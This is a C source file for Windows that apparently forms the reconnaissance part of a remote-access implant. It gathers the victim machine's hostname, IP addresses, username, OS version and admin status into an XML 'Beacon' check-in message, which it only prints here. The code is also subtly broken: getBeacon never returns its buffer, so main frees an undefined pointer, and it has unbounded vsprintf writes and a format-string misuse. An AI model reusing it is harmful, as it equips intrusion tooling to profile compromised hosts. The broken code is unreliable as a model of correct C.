#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>
#include <iphlpapi.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mincore.lib")

LPSTR appendBuff(LPSTR lpPos, LPCSTR format, ...)
{
	va_list args;
	va_start(args, format);

	int n = vsprintf(lpPos, format, args);

	va_end(args);
	return (lpPos + n);
}

LPSTR getHostName()
{
	LPSTR lpszHostname = malloc(150);
	TCHAR infoBuf[150];
	DWORD dwBufCharCount = 150;
	int i;
	if (GetComputerName(infoBuf, &dwBufCharCount)) {
		for (i = 0; i < 150; i++)
			lpszHostname[i] = infoBuf[i];
	} else {
		strcpy(lpszHostname, "");
	}

	return lpszHostname;
}

int getIPAddrs(LPSTR lpszAddrs[], int iMaxAddrs)
{
	PMIB_IPADDRTABLE pIPAddrTable;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
    IN_ADDR IPAddr;

    pIPAddrTable = malloc(sizeof(MIB_IPADDRTABLE));

    if (pIPAddrTable) {
        if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) ==
            ERROR_INSUFFICIENT_BUFFER) {
            free(pIPAddrTable);
            pIPAddrTable = malloc(dwSize);
        }
        if (pIPAddrTable == NULL) {
            printf("[*] Memory allocation failed for GetIPAddrTable\n");
            return 0;
        }
    }

    if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR) {
    	printf("[-] GetIpAddrTable failed\n");
    	return 0;
    }

    int i, n = 0;
    for (i = 0; i < (int) pIPAddrTable->dwNumEntries; i++) {
        IPAddr.S_un.S_addr = (u_long) pIPAddrTable->table[i].dwAddr;
        char *lpszIP = malloc(16);
        if (lpszIP) {
	        sprintf(lpszIP, inet_ntoa(IPAddr));
	        if (strncmp(lpszIP, "127", 3) == 0) {
	            free(lpszIP);
	            continue;
	        }

	        lpszAddrs[n] = lpszIP;
	        n++;

	        if (n > iMaxAddrs)
	            break;
	    }
    }

    if (pIPAddrTable) {
        free(pIPAddrTable);
    }

    return n;
}

static int is_internal_ip(char *_addr)
{
	int priv = 0;

	int f, s, t, fo;
	sscanf(_addr, "%u.%u.%u.%u", &f, &s, &t, &fo);

	// check if IPv4 is private base on first two numbers
	if (f == 10 || f == 127 ||
	    (f == 100 && s >= 64 && s <= 127) ||
	    (f == 172 && s >= 16 && s <= 31) ||
	    (f == 169 && s == 254) || (f == 192 && s == 168))
		priv = 1;

	return priv;
}

LPSTR getOSVersion()
{
	LPSTR lpszOSVersion = malloc(64);
	if (lpszOSVersion == NULL)
		return NULL;

	LPTSTR lpszFilePath = "C:\\Windows\\System32\\kernel32.dll";
	DWORD dwDummy;
	DWORD dwFVISize = GetFileVersionInfoSize(lpszFilePath, &dwDummy);
	if (dwFVISize == 0) {
		printf("GetFileVersionInfoSize failed: %d\n", GetLastError());
		return NULL;
	}

	LPBYTE lpVersionInfo = malloc(dwFVISize);
    if (!GetFileVersionInfo(lpszFilePath,0, dwFVISize, lpVersionInfo)) {
    	printf("GetFileVersionInfo failed\n");
    	return NULL;
    }
    
    UINT uLen;
    VS_FIXEDFILEINFO *lpFfi;

    if (!VerQueryValue(lpVersionInfo, TEXT("\\"), (LPVOID *) &lpFfi, &uLen)) {
    	printf("VerQueryValue\n");
    	return NULL;
    }

    DWORD dwFileVersionMS = lpFfi->dwProductVersionMS;
    DWORD dwFileVersionLS = lpFfi->dwProductVersionLS;

    free(lpVersionInfo);

    DWORD dwLeftMost = HIWORD(dwFileVersionMS);
    DWORD dwSecondLeft = LOWORD(dwFileVersionMS);
    DWORD dwSecondRight = HIWORD(dwFileVersionLS);
    DWORD dwRightMost = LOWORD(dwFileVersionLS);

    sprintf(lpszOSVersion, "%d.%d.%d.%d", dwLeftMost, dwSecondLeft,
    	dwSecondRight, dwRightMost);

	return lpszOSVersion;
}

BOOL isAdmin(void)
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken)
		CloseHandle(hToken);

	return fRet;
}

LPBYTE getBeacon(void)
{
	LPSTR lpBeacon = malloc(1024);
	if (lpBeacon == NULL)
		return NULL;

	LPSTR lpPos = lpBeacon;
	lpPos = appendBuff(lpPos, "<Beacon>\n");
	lpPos = appendBuff(lpPos, "\t<Type>HEY</Type>\n");

	LPSTR lpszHostname = getHostName();
	lpPos = appendBuff(lpPos, "\t<HostName>%s</HostName>\n", lpszHostname);
	free(lpszHostname);

#define MAX_IPS 10
	LPSTR lpszAddrs[MAX_IPS];
	int iNumAddrs = getIPAddrs(lpszAddrs, MAX_IPS);
	int i;
	for (i = 0; i < iNumAddrs; i++) {
		if (is_internal_ip(lpszAddrs[i])) {
			lpPos = appendBuff(lpPos,
				"\t<InternalIP>%s</InternalIP>\n", lpszAddrs[i]);
		} else {
			lpPos = appendBuff(lpPos,
				"\t<ExternalIP>%s</ExternalIP>\n", lpszAddrs[i]);
		}
		free(lpszAddrs[i]);
	}

	DWORD len = UNLEN + 1;
	TCHAR *username = malloc(len);
	if (GetUserName(username, &len)) {
		lpPos = appendBuff(lpPos,
			"\t<CurrentUser>%s</CurrentUser>\n", username);
	} else {
		lpPos = appendBuff(lpPos,
			"\t<CurrentUser></CurrentUser>\n");
	}
	free(username);

	LPSTR lpszOSVersion = getOSVersion();
	if (lpszOSVersion) {
		lpPos = appendBuff(lpPos, "\t<OS>Windows %s</OS>\n", lpszOSVersion);
		free(lpszOSVersion);
	} else {
		lpPos = appendBuff(lpPos, "\t<OS></OS>\n", lpszOSVersion);
	}

	lpPos = appendBuff(lpPos,
		"\t<Admin>%c</Admin>\n", (isAdmin() ? 'Y' : 'N'));

	lpPos = appendBuff(lpPos, "</Beacon>\n");

	printf("%s\n", lpBeacon);
}

int main()
{
	LPBYTE lpBeacon = getBeacon();
	if (lpBeacon)
		free(lpBeacon);
	
	return 0;
}